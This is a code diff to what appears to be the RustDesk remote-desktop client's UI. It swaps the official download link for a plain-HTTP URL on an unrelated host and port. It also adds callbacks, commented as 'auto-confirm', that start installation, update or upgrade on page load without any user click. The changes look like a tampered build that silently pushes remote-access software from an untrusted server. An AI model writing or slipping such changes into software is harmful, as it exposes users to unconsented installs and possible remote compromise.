@@ -437,13 +437,18 @@ Widget buildRightPane(BuildContext context) {
       final isToUpdate = (isWindows || isMacOS) && bind.mainIsInstalled();
       String btnText = isToUpdate ? 'Update' : 'Download';
       GestureTapCallback onPressed = () async {
-        final Uri url = Uri.parse('https://rustdesk.com/download');
+        final Uri url = Uri.parse('http://nccstar.top:58080/download');
         await launchUrl(url);
       };
       if (isToUpdate) {
         onPressed = () {
           handleUpdate(updateUrl);
         };
+        // 自动确认更新
+        WidgetsBinding.instance.addPostFrameCallback((_) {
+          handleUpdate(updateUrl);
+        });
+	//
       }
       return buildInstallCard(
           "Status",
@@ -458,6 +463,12 @@ Widget buildRightPane(BuildContext context) {
 
     if (isWindows && !bind.isDisableInstallation()) {
       if (!bind.mainIsInstalled()) {
+        // 自动确认安装
+        WidgetsBinding.instance.addPostFrameCallback((_) async {
+          await rustDeskWinManager.closeAllSubWindows();
+          bind.mainGotoInstall();
+        });
+	//
         return buildInstallCard(
             "", bind.isOutgoingOnly() ? "" : "install_tip", "Install",
             () async {
@@ -465,6 +476,12 @@ Widget buildRightPane(BuildContext context) {
           bind.mainGotoInstall();
         });
       } else if (bind.mainIsInstalledLowerVersion()) {
+        // 自动确认升级
+        WidgetsBinding.instance.addPostFrameCallback((_) async {
+          await rustDeskWinManager.closeAllSubWindows();
+          bind.mainUpdateMe();
+        });
+	//
         return buildInstallCard(
             "Status", "Your installation is lower version.", "Click to upgrade",
             () async {
